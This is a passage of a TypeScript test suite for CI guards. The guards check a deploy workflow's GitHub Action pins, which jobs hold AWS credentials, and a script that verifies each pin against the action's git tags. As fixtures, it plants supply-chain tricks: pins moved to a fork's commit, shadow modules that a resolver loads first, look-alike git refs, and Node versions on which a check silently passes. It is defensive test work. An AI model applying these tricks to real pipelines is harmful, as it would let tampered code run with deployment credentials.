      const declared = /^(?:export )?(?:function|const|let|type|interface) (\w+)/.exec(line)?.[1]
      if (declared !== undefined) {
        if (name !== undefined) found.set(name, body.join('\n'))
        ;[name, body] = [declared, []]
      }
      if (!/^\s*\/\//.test(line)) body.push(line)
    }
    if (name !== undefined) found.set(name, body.join('\n'))
    return found
  }
  const unlisted = (source: string): string[] => {
    const problems: string[] = []
    const readers = [...declarations(source)].filter(([, body]) => body.includes('.get(DEPLOY)'))
    for (const [name, body] of readers) {
      const listed = DEPLOY_TEXT_READERS[name]
      if (listed === undefined) problems.push(`${name} reads deploy.yml and isn't listed`)
      else if ((listed.jobs === true) !== body.includes('jobsOf(')) problems.push(`${name} reads jobs otherwise`)
      else if ((listed.expanded === true) !== body.includes('expandRunAliases(')) {
        problems.push(`${name} reads the expansion otherwise`)
      }
    }
    for (const name of Object.keys(DEPLOY_TEXT_READERS)) {
      if (!readers.some(([each]) => each === name)) problems.push(`${name} is listed and reads deploy.yml no more`)
    }
    if (!/^function jobSpans\(text: RunsWrittenOut\)/m.test(source))
      problems.push('jobSpans takes more than the expansion')
    return problems
  }
  const source = readRepoFile('scripts/guards/deploy-workflow.ts')

  it('lists every reader of deploy.yml in the guard with how it reads, and jobSpans() takes only the expansion', () => {
    expect(unlisted(source)).toEqual([])
    const planted = `${source}\nexport function plantedFindings(workflows: Texts): Finding[] {\n  return [workflows.get(DEPLOY) ?? '']\n}\n`
    expect(unlisted(planted)).toEqual(["plantedFindings reads deploy.yml and isn't listed"])
    expect(
      unlisted(
        source.replace('const text = expandRunAliases(workflows.get(DEPLOY)', 'const text = (workflows.get(DEPLOY)'),
      ),
    ).toEqual(['actionPinFindings reads the expansion otherwise'])
    expect(
      unlisted(source.replace('function jobSpans(text: RunsWrittenOut)', 'function jobSpans(text: string)')),
    ).toEqual(['jobSpans takes more than the expansion'])
  })
})

describe('DPW-03 (C11-D55, C11-D56): only the five environment jobs hold AWS credentials', () => {
  it('finds each planted breakage', () => {
    expect(
      credentialJobFindings(
        plant(
          '          printf \'%s\' "$READBACK"',
          '          aws sts get-caller-identity\n          printf \'%s\' "$READBACK"',
          job('smoke-nonprod'),
        ),
      ),
    ).toEqual([
      `${DEPLOY}: DPW-03 smoke-nonprod: runs aws, the CDK CLI or skopeo, or takes credentials, which only the five environment jobs may`,
    ])
    expect(
      credentialJobFindings(plant('    environment: nonprod\n', '    environment: prod\n', job('rollback-nonprod'))),
    ).toEqual([`${DEPLOY}: DPW-03 rollback-nonprod: names the environment nonprod`])
    expect(credentialJobFindings(plant('    environment: prod\n', '    environment: restore\n', job('prod')))).toEqual([
      `${DEPLOY}: DPW-03 prod: names the environment prod`,
    ])
    expect(
      credentialJobFindings(
        plant('    cache-mode: none\n', '    cache-mode: none\n    environment: nonprod\n', job('gate')),
      ),
    ).toEqual([`${DEPLOY}: DPW-03 gate: names no environment`])
  })

  it('holds the repository', () => {
    expect(credentialJobFindings(workflows)).toEqual([])
  })
})

describe('DPW-04 (C11-D48, C11-D79): action pins', () => {
  const PIN = pinOf('actions/checkout')
  const pinned = (where: string) =>
    `${DEPLOY}: DPW-04 ${where}: every uses: is checkout, setup-node, upload-artifact, download-artifact or the credentials action, at exactly the commit and version comment ACTION_PINS names, which CI proves against the action's own repository`
  const FOUND = [pinned('gate')]
  const pin = (to: string) => actionPinFindings(plant(PIN, to))
  const FOLDER = `${DEPLOY}: DPW-04 .github/workflows holds workflows alone (<name>.yml or <name>.yaml, with no @ in the name): no actions lockfile or other file beside them`

  it('finds each planted breakage', () => {
    expect(pin('actions/checkout@v7')).toEqual(FOUND)
    expect(pin('actions/checkout@main # v7.0.1')).toEqual(FOUND)
    expect(pin(`actions/checkout@${'a'.repeat(39)} # v7.0.1`)).toEqual(FOUND)
    expect(pin(`actions/checkout@${'a'.repeat(40)}`)).toEqual(FOUND)
    expect(pin(`docker/setup-buildx-action@${'a'.repeat(40)} # v3.11.1`)).toEqual(FOUND)
    expect(pin('./.github/actions/x')).toEqual(FOUND)
    expect(pin('docker://alpine@sha256:0')).toEqual(FOUND)
    // FETCH-A1-01: a pin moved to another commit, under the same version comment or another, which GitHub
    // resolves under the action's name if a fork holds it.
    const fork = '5f1c0a7e9d2b4c6a8e0f1b3d5c7e9a1b2c4d6e8f'
    expect(nextVersion(PIN)).not.toBe(PIN)
    expect(pin(atCommit(PIN, fork))).toEqual(FOUND)
    expect(pin(nextVersion(PIN))).toEqual(FOUND)
    expect(pin(nextVersion(atCommit(PIN, fork)))).toEqual(FOUND)
  })

  it('holds each action of a credentialed job to its pin (FETCH-A1-01)', () => {
    const fork = '5f1c0a7e9d2b4c6a8e0f1b3d5c7e9a1b2c4d6e8f'
    for (const [id, from, to] of [
      ['nonprod', pinOf('actions/checkout'), atCommit(pinOf('actions/checkout'), fork)],
      [
        'prod-plan',
        pinOf('actions/download-artifact'),
        nextVersion(atCommit(pinOf('actions/download-artifact'), fork)),
      ],
      [
        'rollback-prod',
        pinOf('aws-actions/configure-aws-credentials'),
        atCommit(pinOf('aws-actions/configure-aws-credentials'), fork),
      ],
    ] as const) {
      expect(actionPinFindings(plant(from, to, job(id))), id).toEqual([pinned(id)])
    }
  })

  it('finds a file beside the workflows', () => {
    const real = [...workflows.keys()]
    expect(actionPinFindings(workflows, [...real, '.github/workflows/actions.lock'])).toEqual([FOLDER])
    expect(actionPinFindings(workflows, [...real, '.github/workflows/sub/x.yml'])).toEqual([FOLDER])
    expect(actionPinFindings(workflows, [...real, '.github/workflows/x.yml.bak'])).toEqual([FOLDER])
  })

  // Round 12's fourth iteration: the gate's PULL_CHECKS and prod-gate's MAIN_CI read ci.yml's runs as the path
  // before the first @ (GitHub may give a run's path a ref after one), so a workflow named ci.yml@x.yml, whose
  // jobs check and migrations always passed, read as ci.yml, and the newer run's conclusions were the merge's
  // and main's. No workflow's name holds an @ now.
  it('finds a workflow whose name holds an @, which the gate would read as ci.yml', () => {
    const real = [...workflows.keys()]
    for (const path of [
      '.github/workflows/ci.yml@x.yml',
      '.github/workflows/ci.yml@main.yaml',
      '.github/workflows/@.yml',
    ]) {
      expect(actionPinFindings(workflows, [...real, path]), path).toEqual([FOLDER])
    }
    expect(actionPinFindings(workflows, [...real, '.github/workflows/ci-extra.yml'])).toEqual([])
    for (const text of [PULL_CHECKS, MAIN_CI])
      expect(text).toContain('(.path | sub("@.*$"; "")) == ".github/workflows/ci.yml"')
  })

  // FETCH-A2-01 (round 6). The guard imported './action-pins' with no extension, which Vitest resolves to a
  // file of that very name first, then .mjs, .js and .mts before .ts, while the pins check imports the .ts by
  // its full name, as Node does. So an action-pins.mjs beside action-pins.ts, holding a pin moved with
  // deploy.yml's to a commit no tag names, was the table DPW-04 bound deploy.yml to, while the check proved the
  // .ts's real pins, and both passed. The guard now names every module by its .ts file, and scripts/ holds no
  // file a resolver could load in place of a .ts one.
  it('finds a file a module resolver would load in place of a guard’s .ts module (FETCH-A2-01, round 6)', () => {
    const SHADOW = `scripts: DPW-04 holds no JavaScript, no other TypeScript flavour (.js, .mjs, .cjs, .jsx, .mts, .cts, .tsx) and no file without an extension, any of which Vitest would load in place of a guard module named without its .ts`
    const real = [...workflows.keys()]
    for (const path of [
      'scripts/guards/action-pins.mjs',
      'scripts/guards/action-pins.js',
      'scripts/guards/action-pins.mts',
      'scripts/guards/action-pins.cjs',
      'scripts/guards/action-pins.cts',
      'scripts/guards/action-pins.jsx',
      'scripts/guards/action-pins.tsx',
      'scripts/guards/action-pins',
      'scripts/guards/workflow.mjs',
      'scripts/guards/sub/deploy-workflow.js',
      'scripts/check-action-pins.mjs',
      'scripts/owner-bootstrap/target.js',
    ]) {
      expect(actionPinFindings(workflows, [...real, path]), path).toEqual([SHADOW])
    }
    for (const path of [
      'scripts/guards/action-pins.ts',
      'scripts/check-server.sh',
      'scripts/schema-digest.sql',
      'apps/web/vite.config.js',
      'scripts-other/x.mjs',
    ]) {
      expect(actionPinFindings(workflows, [...real, path]), path).toEqual([])
    }
  })

  it('names every module the guard, its tests and the pins check import by its .ts file (FETCH-A2-01, round 6)', () => {
    const relative = (path: string, source: string) =>
      moduleImports(source, path).flatMap(each =>
        each.specifier !== undefined && /^\.\.?\//.test(each.specifier) ? [each.specifier] : [],
      )
    const named = (path: string, source: string) =>
      relative(path, source).filter(
        specifier => !specifier.endsWith('.ts') || !existsSync(join(root, dirname(path), specifier)),
      )
    for (const path of [
      'scripts/guards/deploy-workflow.ts',
      'scripts/guards/deploy-workflow.test.ts',
      'scripts/guards/action-pins.ts',
      'scripts/guards/workflow.ts',
      'scripts/guards/repo-files.ts',
      'scripts/guards/imports.ts',
      'scripts/check-action-pins.ts',
    ]) {
      expect(named(path, readRepoFile(path)), path).toEqual([])
    }
    expect(relative('scripts/guards/deploy-workflow.ts', readRepoFile('scripts/guards/deploy-workflow.ts'))).toEqual([
      './action-pins.ts',
      './workflow.ts',
    ])
    const planted = "import { ACTION_PINS } from './action-pins'\nimport { x } from './missing.ts'\n"
    expect(named('scripts/guards/deploy-workflow.ts', planted)).toEqual(['./action-pins', './missing.ts'])
  })

  // Run through Vitest's own resolver: the guard's import line, in a folder where action-pins.ts stands beside
  // a file Vitest would resolve first for a name without its extension, loads the .ts, while the same line
  // without its extension loads the other file, as the guard did before.
  it('loads action-pins.ts by the guard’s own import line whatever stands beside it (FETCH-A2-01, round 6)', async () => {
    const line =
      readRepoFile('scripts/guards/deploy-workflow.ts')
        .split('\n')
        .find(each => each.startsWith('import ') && each.includes("from './action-pins")) ?? ''
    expect(line).toBe("import { ACTION_PINS, PIN_SHAPE, PINS_JOB_ACTIONS } from './action-pins.ts'")
    const moved = `export const ACTION_PINS = { 'actions/checkout': 'moved' }\nexport const PIN_SHAPE = /x/\nexport const PINS_JOB_ACTIONS = {}\n`
    for (const shadow of ['action-pins.mjs', 'action-pins.js', 'action-pins.mts']) {
      const folder = mkdtempSync(join(tmpdir(), 'guard-shadow-'))
      try {
        writeFileSync(join(folder, 'action-pins.ts'), readRepoFile('scripts/guards/action-pins.ts'))
        writeFileSync(join(folder, shadow), moved)
        writeFileSync(join(folder, 'guard.ts'), `${line}\nexport { ACTION_PINS, PIN_SHAPE, PINS_JOB_ACTIONS }\n`)
        writeFileSync(
          join(folder, 'bare.ts'),
          `${line.replace("'./action-pins.ts'", "'./action-pins'")}\nexport { ACTION_PINS, PIN_SHAPE, PINS_JOB_ACTIONS }\n`,
        )
        const guard = (await import(join(folder, 'guard.ts'))) as { ACTION_PINS: unknown }
        const bare = (await import(join(folder, 'bare.ts'))) as { ACTION_PINS: unknown }
        expect(guard.ACTION_PINS, shadow).toEqual(ACTION_PINS)
        expect(bare.ACTION_PINS, shadow).toEqual({ 'actions/checkout': 'moved' })
      } finally {
        rmSync(folder, { recursive: true, force: true })
      }
    }
  })

  // FETCH-A6-01 (round 6). .nvmrc chooses the pins job's Node and every deploy job's. A JSON .nvmrc that
  // setup-node 7.1 (the pins job's and deploy.yml's) reads by devEngines.runtime, 24.1.0, and setup-node 5
  // (check's) by engines.node, 24, gave the pins job a Node without import.meta.main, on which the check
  // ran nothing and exited 0, while check ran a Node new enough to pass: a pin moved with its table entry to
  // a fork's commit passed CI, and every deploy job's smoke would have passed a broken release the same way.
  it('holds .nvmrc to 24 alone, which every setup-node reads as a Node 24 (FETCH-A6-01, round 6)', () => {
    const NODE = `.nvmrc: DPW-04 is 24 alone, a line of its own, which every setup-node reads as a Node 24 (the newest the runner caches, or the newest in the manifest when it caches none), so no manifest, range or release read differently by the two setup-node versions gives the pins check or a deploy job a Node without import.meta.main, on which it would run nothing and exit 0`
    for (const planted of [
      '{"devEngines":{"runtime":{"name":"node","version":"24.1.0"}},"engines":{"node":"24"}}\n',
      '{"volta":{"node":"24.1.0"}}\n',
      '[tools]\nnode = "24.1.0"\n',
      '24.1.0\n',
      'v24\n',
      'node 24\n',
      '>=24.2\n',
      'lts/*\n',
      '24',
      '24\n\n',
      ' 24\n',
    ]) {
      expect(actionPinFindings(workflows, undefined, planted), JSON.stringify(planted)).toEqual([NODE])
    }
    expect(actionPinFindings(workflows, undefined, NVMRC)).toEqual([])
    expect(NVMRC).toBe('24\n')
    // And each script the pipeline runs whose answer a gate, a smoke or a person rests on refuses a Node
    // without import.meta.main, on which it would otherwise run nothing and exit 0 (a smoke passed, say).
    for (const [script, said] of [
      ['history', 'nothing was decided'],
      ['smoke', 'nothing was judged'],
      ['floors-check', 'no floor was checked'],
    ] as const) {
      const code = readRepoFile(`infra/scripts/deploy/${script}.ts`).trimEnd().split('\n')
      const refusal = [
        "if (typeof import.meta.main !== 'boolean') {",
        `  process.stderr.write('${script}: Node 24.2 or later is needed (import.meta.main), so ${said}\\n')`,
        '  process.exit(1)',
        '}',
        'if (import.meta.main) process.exitCode = await main(process.argv.slice(2))',
      ]
      expect(code.slice(-refusal.length), script).toEqual(refusal)
      const older = spawnSync(
        process.execPath,
        [
          '--input-type=module',
          '-e',
          refusal.slice(0, 4).join('\n').replace('typeof import.meta.main', 'typeof undefined'),
        ],
        { encoding: 'utf8' },
      )
      expect(older.status, script).toBe(1)
      expect(older.stderr, script).toBe(`${script}: Node 24.2 or later is needed (import.meta.main), so ${said}\n`)
    }
  })

  it('holds the repository', () => {
    expect(actionPinFindings(workflows, files, readRepoFile('.nvmrc'))).toEqual([])
    // The table names exactly the actions deploy.yml uses, each in the shape scripts/check-action-pins.ts reads.
    const used = new Set([...deployText.matchAll(/^\s+(?:- )?uses: ([^@\s]+)@/gm)].map(each => each[1]))
    expect([...used].sort()).toEqual(Object.keys(ACTION_PINS).sort())
    for (const [action, entry] of Object.entries(ACTION_PINS)) {
      expect(ACTION_SHAPE.test(action), action).toBe(true)
      expect(PIN_SHAPE.test(entry), action).toBe(true)
    }
    // ci.yml's job action-pins runs checkout and setup-node alone before the check, each at its entry here.
    expect(Object.keys(PINS_JOB_ACTIONS).sort()).toEqual(['actions/checkout', 'actions/setup-node'])
    for (const entry of Object.values(PINS_JOB_ACTIONS)) expect(PIN_SHAPE.test(entry), entry).toBe(true)
  })
})

describe('scripts/check-action-pins.ts (DPW-04): each pin against its action’s own repository', () => {
  const commit = '3d3c42e5aac5ba805825da76410c181273ba90b1'
  const other = '5f1c0a7e9d2b4c6a8e0f1b3d5c7e9a1b2c4d6e8f'

  it('reads the commit a tag names, the peeled one of an annotated tag, from the two exact refs alone', () => {
    expect(tagCommit(`${commit}\trefs/tags/v7.0.1\n`, 'v7.0.1')).toBe(commit)
    expect(tagCommit(`${other}\trefs/tags/v7.0.1\n${commit}\trefs/tags/v7.0.1^{}\n`, 'v7.0.1')).toBe(commit)
    expect(tagCommit('', 'v7.0.1')).toBeUndefined()
    // What git ls-remote prints beside the tag for the two patterns, since it matches each against a ref's
    // tail at a /: a branch named refs/tags/v7.0.1 (sorted before the tag) and a tag x/refs/tags/v7.0.1 with
    // its peeled line (after it). Neither names the tag's commit, alone or beside the tag's own lines
    // (FETCH-G1-01, round 12).
    const branch = `${other}\trefs/heads/refs/tags/v7.0.1\n`
    const nested = `${other}\trefs/tags/x/refs/tags/v7.0.1\n${other}\trefs/tags/x/refs/tags/v7.0.1^{}\n`
    expect(tagCommit(branch, 'v7.0.1')).toBeUndefined()
    expect(tagCommit(nested, 'v7.0.1')).toBeUndefined()
    expect(tagCommit(`${branch}${nested}`, 'v7.0.1')).toBeUndefined()
    expect(tagCommit(`${branch}${commit}\trefs/tags/v7.0.1\n${nested}`, 'v7.0.1')).toBe(commit)
    expect(tagCommit(`${branch}${other}\trefs/tags/v7.0.1\n${commit}\trefs/tags/v7.0.1^{}\n${nested}`, 'v7.0.1')).toBe(
      commit,
    )
  })

  it('finds a pin its tag doesn’t name, a missing tag and an entry in another shape', () => {
    const answer = (sha: string) => () => `${sha}\trefs/tags/v7.0.1\n`
    const pins = { 'actions/checkout': `${commit} # v7.0.1` }
    expect(pinProblems(pins, answer(commit))).toEqual([])
    expect(pinProblems(pins, answer(other))).toEqual([
      "actions/checkout: tag v7.0.1 names another commit than the pin's",
    ])
    expect(pinProblems(pins, () => '')).toEqual(['actions/checkout: the repository has no tag v7.0.1'])
    expect(pinProblems({ 'actions/checkout': `${commit}` }, answer(commit))).toEqual([
      'actions/checkout: the pin is not <40-hex commit> # v<major>.<minor>.<patch>',
    ])
    expect(pinProblems({ 'actions/checkout/../x': `${commit} # v7.0.1` }, answer(commit))).toEqual([
      'actions/checkout/../x: the pin is not <40-hex commit> # v<major>.<minor>.<patch>',
    ])
    // It asks for the version's own tag of the action's own repository.
    const asked: string[] = []
    pinProblems(pins, (action, version) => {
      asked.push(`${action} ${version}`)
      return `${commit}\trefs/tags/${version}\n`
    })
    expect(asked).toEqual(['actions/checkout v7.0.1'])
  })

  // FETCH-A2-01 (round 6): the check reads deploy.yml's uses: itself, as Node reads the file and GitHub runs
  // it, so the commits it proves are the ones deploy.yml runs, whatever table a test run binds it to.
  it('holds every uses: in deploy.yml, read from the file, to its ACTION_PINS entry (FETCH-A2-01, round 6)', () => {
    // deploy.yml as stored, as the check reads it (the shared runs' layout has its own case, in round 13's DPW-02).
    expect(deployPinProblems(committedDeploy)).toEqual([])
    const real = pinOf('actions/checkout')
    const shadow = atCommit(real, 'a81bbbf8298c0fa03ea29cdc473d45769f953675')
    const lines = deployText.split(real).length - 1
    expect(lines).toBeGreaterThan(1)
    expect(deployPinProblems(deployText.replaceAll(real, shadow))).toHaveLength(lines)
    // The first checkout's line, edited alone.
    const first = `        uses: ${real}\n`
    const at = deployText.slice(0, deployText.indexOf(first)).split('\n').length
    const once = (to: string) => deployPinProblems(edited(deployText, first, to))
    const other = `line ${at}: runs actions/checkout at another commit or version than its ACTION_PINS entry`
    const shape = `line ${at}: names uses in another shape than a step's pinned uses:`
    const unread = `line ${at}: in none of the shapes the workflow reader reads`
    expect(once(`        uses: ${shadow}\n`)).toEqual([other])
    expect(once(`        uses: ${nextVersion(real)}\n`)).toEqual([other])
    expect(once(`        uses: ${real.replace('actions/', 'action/')}\n`)).toEqual([
      `line ${at}: runs action/checkout at another commit or version than its ACTION_PINS entry`,
    ])
    expect(once(`        uses: ${real} \n`)).toEqual([shape])
    expect(once(`        uses: '${real}'\n`)).toEqual([shape])
    expect(once('        uses: ./.github/actions/x\n')).toEqual([shape])
    expect(once(`        Uses: ${real}\n`)).toEqual([shape])
    expect(once(`        "uses": ${shadow}\n`)).toEqual([unread, shape])
    // A key spelled with an escape holds no word uses, and is refused as a key the reader doesn't read.
    expect(once(`        "u\\x73es": ${shadow}\n`)).toEqual([unread])
    expect(once(`${first}          # pinned uses: above\n`)).toEqual([
      `line ${at + 1}: names uses in another shape than a step's pinned uses:`,
    ])
    expect(deployPinProblems('')).toEqual(['names no pinned uses:'])
  })

  // RULES-01 (review 5): CI's proof of the pins is the script's own decision, which nothing but the owner's read
  // held, so a pull request could move a pin to a fork's commit and, beside it, have the check skip a read or
  // exit 0 with every test green. Its decision runs here end to end on planted answers, for each entry of both
  // tables alone, and every address it reads is the action's own repository.
  describe('the check end to end (RULES-01)', () => {
    const entries = [
      ...Object.entries(ACTION_PINS).map(([action, pin]) => ['deploy.yml', action, pin] as const),
      ...Object.entries(PINS_JOB_ACTIONS).map(([action, pin]) => ['action-pins job', action, pin] as const),
    ]
    const tagOf = (pin: string) => PIN_SHAPE.exec(pin) ?? []
    const commits = new Map(entries.map(([, action, pin]) => [`${action} ${tagOf(pin)[2]}`, tagOf(pin)[1]]))
    const answer = (action: string, version: string) => `${commits.get(`${action} ${version}`)}\trefs/tags/${version}\n`
    const quietly = (read: (action: string, version: string) => string, deploy?: string) => {
      const log = vi.spyOn(console, 'log').mockImplementation(() => undefined)
      const error = vi.spyOn(console, 'error').mockImplementation(() => undefined)
      try {
        return checkActionPins(read, deploy)
      } finally {
        log.mockRestore()
        error.mockRestore()
      }
    }

    it('exits 0 only when every pin of both tables is its tag’s commit', () => {
      expect(entries.length).toBe(7)
      expect(quietly(answer)).toBe(0)
    })

    // FETCH-A2-01 (round 6): deploy.yml's checkout moved to a commit no tag names, every table entry still its
    // tag's commit (the table a shadow file stood in for under Vitest), fails the check on deploy.yml's own text.
    it('exits 1 when deploy.yml runs a pin its table doesn’t name, every entry its tag’s commit (FETCH-A2-01, round 6)', () => {
      const real = pinOf('actions/checkout')
      const moved = deployText.replaceAll(real, atCommit(real, 'a81bbbf8298c0fa03ea29cdc473d45769f953675'))
      expect(quietly(answer, deployText)).toBe(0)
      expect(quietly(answer, moved)).toBe(1)
      expect(quietly(answer, '')).toBe(1)
    })

    it('exits 1 for each entry alone at another commit, with no tag, or whose read fails', () => {
      for (const [table, action, pin] of entries) {
        const [, commit = '', version = ''] = tagOf(pin)
        const other = commit.replace(/^./, first => (first === '0' ? '1' : '0'))
        const only = (planted: (version: string) => string) => (asked: string, askedVersion: string) =>
          asked === action && askedVersion === version ? planted(askedVersion) : answer(asked, askedVersion)
        const way = `${table} ${action}`
        expect(quietly(only(tag => `${other}\trefs/tags/${tag}\n`)), `${way} at another commit`).toBe(1)
        expect(quietly(only(tag => `${other}\trefs/tags/${tag}\n${other}\trefs/tags/${tag}^{}\n`)), way).toBe(1)
        expect(quietly(only(() => '')), `${way} with no tag`).toBe(1)
        // git's tail match prints a branch named refs/tags/<v> and a tag x/refs/tags/<v> beside the tag: at the
        // pin's commit, alone or beside the tag at another (FETCH-G1-01, round 12).
        const tails = (tag: string) =>
          `${commit}\trefs/tags/x/refs/tags/${tag}\n${commit}\trefs/tags/x/refs/tags/${tag}^{}\n`
        expect(
          quietly(only(tag => `${commit}\trefs/heads/refs/tags/${tag}\n${tails(tag)}`)),
          `${way} under another ref`,
        ).toBe(1)
        expect(
          quietly(only(tag => `${commit}\trefs/heads/refs/tags/${tag}\n${other}\trefs/tags/${tag}\n${tails(tag)}`)),
          `${way} beside refs that end like the tag`,
        ).toBe(1)
        expect(
          quietly(
            only(() => {
              throw new Error('check-action-pins: the read failed')
            }),
          ),
          `${way} whose read fails`,
        ).toBe(1)
      }
    })

    it('reads each action from its own repository, and exits with the check’s answer', () => {
      expect(Object.keys({ ...ACTION_PINS, ...PINS_JOB_ACTIONS }).map(actionUrl)).toEqual([
        'https://github.com/actions/checkout.git',
        'https://github.com/actions/setup-node.git',
        'https://github.com/actions/upload-artifact.git',
        'https://github.com/actions/download-artifact.git',
        'https://github.com/aws-actions/configure-aws-credentials.git',
      ])
      for (const [, action, pin] of entries) {
        const version = tagOf(pin)[2] ?? ''
        const asked: string[] = []
        expect(
          lsRemote(action, version, (url, tag) => {
            asked.push(`${url} ${tag}`)
            return 'answer'
          }),
        ).toBe('answer')
        expect(asked).toEqual([`https://github.com/${action}.git ${version}`])
      }
      // The script's last line exits with main's answer, the checkout's drift and then run's over lsRemote, so
      // neither a skipped exit nor another reader stands in for it; and before it, a Node without
      // import.meta.main (older than 24.2), on which that line would never call main and the script would exit
      // 0 having read nothing, exits 1 (FETCH-A6-01, round 6; the drift from round 12's third iteration).
      const source = readRepoFile('scripts/check-action-pins.ts')
      const code = source.trimEnd().split('\n')
      const mainAt = code.indexOf('export function main(): number {')
      expect(code.slice(mainAt, mainAt + 8)).toEqual([
        'export function main(): number {',
        "  const drift = checkoutDrift(fileURLToPath(new URL('..', import.meta.url)))",
        '  if (drift.length > 0) {',
        "    for (const line of refusedDrift('check-action-pins', drift)) console.error(line)",
        '    return 1',
        '  }',
        '  return run(lsRemote)',
        '}',
      ])
      const refusal = [
        "if (typeof import.meta.main !== 'boolean') {",
        "  console.error('check-action-pins: Node 24.2 or later is needed (import.meta.main), so no pin was read')",
        '  process.exit(1)',
        '}',
        'if (import.meta.main) process.exit(main())',
      ]
      expect(code.slice(-refusal.length)).toEqual(refusal)
      expect(
        code.filter(
          line =>
            !line.trimStart().startsWith('//') && /\bimport\.meta\.main\b|process\.(?:exit|exitCode)\b/.test(line),
        ),
      ).toEqual([
        "if (typeof import.meta.main !== 'boolean') {",
        "  console.error('check-action-pins: Node 24.2 or later is needed (import.meta.main), so no pin was read')",
        '  process.exit(1)',
        'if (import.meta.main) process.exit(main())',
      ])
      // Run as a Node older than 24.2 runs it, import.meta.main undefined: it says so and exits 1.
      const older = spawnSync(
        process.execPath,
        [
          '--input-type=module',
          '-e',
          refusal.slice(0, 4).join('\n').replace('typeof import.meta.main', 'typeof undefined'),
        ],
        { encoding: 'utf8' },
      )
      expect(older.status).toBe(1)
      expect(older.stderr).toContain('no pin was read')
    })
  })

  // FETCH-G1-01 (round 12): git ls-remote matches each pattern against a ref's tail at a /, so beside the tag
  // it prints a branch named refs/tags/<v> and a tag x/refs/tags/<v>, which can name any commit of the action's
  // own repository. Read here from a repository that holds both at another commit than the tag's, through the
  // check's own reader, so the answer is git's: the check names the tag's commit, refuses a pin at the other
  // and accepts one at the tag's.
  it('names the tag’s commit beside refs whose names only end like the tag, as git prints them (FETCH-G1-01, round 12)', () => {
    const folder = mkdtempSync(join(tmpdir(), 'hearth-action-pins-'))
    try {
      const env = { PATH: process.env.PATH ?? '', HOME: join(folder, 'home') }
      const git = (args: readonly string[]) =>
        execFileSync(
          'git',
          [
            ...['-c', 'user.name=hearth-test', '-c', `user.email=${['test', 'example.invalid'].join('@')}`],
            ...['-c', 'commit.gpgsign=false', '-c', 'tag.gpgSign=false', '-c', 'core.hooksPath=/dev/null', ...args],
          ],
          {
            cwd: join(folder, 'action'),
            encoding: 'utf8',
            env: { ...env, GIT_CONFIG_NOSYSTEM: '1', GIT_CONFIG_GLOBAL: '/dev/null' },
            stdio: ['ignore', 'pipe', 'pipe'],
          },
        ).trim()
      execFileSync('mkdir', ['-p', join(folder, 'action'), env.HOME])
      git(['init', '-q'])
      git(['commit', '-q', '--allow-empty', '-m', 'tagged'])
      git(['tag', '-a', '-m', 'tagged', 'v7.0.1'])
      const tagged = git(['rev-parse', 'HEAD'])
      git(['commit', '-q', '--allow-empty', '-m', 'other'])
      const other = git(['rev-parse', 'HEAD'])
      git(['update-ref', 'refs/heads/refs/tags/v7.0.1', other])
      git(['tag', '-a', '-m', 'other', 'x/refs/tags/v7.0.1', other])
      const answer = readTagRefs(`file://${join(folder, 'action')}`, 'v7.0.1', env)
      expect(answer.split('\n').map(line => line.replace(/^[0-9a-f]{40}\t/, ''))).toEqual([
        'refs/heads/refs/tags/v7.0.1',
        'refs/tags/v7.0.1',
        'refs/tags/v7.0.1^{}',
        'refs/tags/x/refs/tags/v7.0.1',
        'refs/tags/x/refs/tags/v7.0.1^{}',
        '',
      ])
      expect(answer).toContain(`${other}\trefs/tags/x/refs/tags/v7.0.1^{}`)
      expect(tagCommit(answer, 'v7.0.1')).toBe(tagged)
      expect(pinProblems({ 'actions/checkout': `${other} # v7.0.1` }, () => answer)).toEqual([
        "actions/checkout: tag v7.0.1 names another commit than the pin's",
      ])
      expect(pinProblems({ 'actions/checkout': `${tagged} # v7.0.1` }, () => answer)).toEqual([])
    } finally {
      rmSync(folder, { recursive: true, force: true })
    }
  })

  // Round 12's third iteration: Node runs the check, and it reads deploy.yml and the tables, as the checkout
  // writes them through .gitattributes, while the owner reads their blobs, so an ident attribute on the check
  // turned a comparison its blob made into one that never held. The script now refuses, before reading any tag,
  // a checkout whose files aren't HEAD's blobs: here a fresh clone of a repository holding the check's files,
  // whose .gitattributes writes deploy.yml with other line endings, run as CI runs it (with a proxy that answers
  // nothing, so no tag could be read had it gone on).
  it('refuses a checkout whose files aren’t HEAD’s blobs before it reads a tag (round 12)', () => {
    const folder = mkdtempSync(join(tmpdir(), 'hearth-action-pins-'))
    try {
      const env = { PATH: process.env.PATH ?? '', HOME: join(folder, 'home') }
      const gitEnv = { ...env, GIT_CONFIG_NOSYSTEM: '1', GIT_CONFIG_GLOBAL: '/dev/null' }
      const git = (cwd: string, args: readonly string[]) =>
        execFileSync(
          'git',
          [
            ...['-c', 'user.name=hearth-test', '-c', `user.email=${['test', 'example.invalid'].join('@')}`],
            ...['-c', 'commit.gpgsign=false', '-c', 'core.hooksPath=/dev/null', ...args],
          ],
          { cwd, encoding: 'utf8', env: gitEnv, stdio: ['ignore', 'pipe', 'pipe'] },
        )
      const source = join(folder, 'source')
      execFileSync('mkdir', ['-p', join(source, 'scripts/guards'), join(source, '.github/workflows'), env.HOME])
      for (const path of [
        'scripts/check-action-pins.ts',
        'scripts/checkout-blobs.ts',
        'scripts/guards/action-pins.ts',
        'scripts/guards/workflow.ts',
        DEPLOY,
      ])
        writeFileSync(join(source, path), readRepoFile(path))
      writeFileSync(join(source, 'package.json'), '{ "type": "module" }\n')
      writeFileSync(join(source, '.gitattributes'), `${DEPLOY} eol=crlf\n`)
      git(source, ['init', '-q'])
      git(source, ['add', '-A'])
      git(source, ['commit', '-qm', 'the check'])
      git(folder, ['clone', '-q', source, 'job'])
      const job = join(folder, 'job')
      expect(readFileSync(join(job, DEPLOY), 'utf8')).toContain('\r\n')
      const proxy = 'http://127.0.0.1:9'
      const checked = spawnSync(process.execPath, ['scripts/check-action-pins.ts'], {
        cwd: job,
        encoding: 'utf8',
        env: { ...env, https_proxy: proxy, HTTPS_PROXY: proxy, http_proxy: proxy, HTTP_PROXY: proxy },
        timeout: 120_000,
      })
      expect(checked.status).toBe(1)
      expect(checked.stderr).toContain(`${DEPLOY}: the checkout's bytes aren't its committed blob's`)
      expect(checked.stderr).toContain(
        "check-action-pins: the checkout isn't what HEAD commits (a git attribute, such as ident, eol, text, filter or working-tree-encoding, or a step before this wrote other bytes), so nothing was checked",
      )
      expect(checked.stdout).not.toContain("its tag's commit")
      expect(checked.stderr).not.toContain("couldn't read")
    } finally {
      rmSync(folder, { recursive: true, force: true })
    }
  }, 150_000)

  // Round 12's second iteration: the pins job's own two actions are proved by hand, with the git ls-remote line
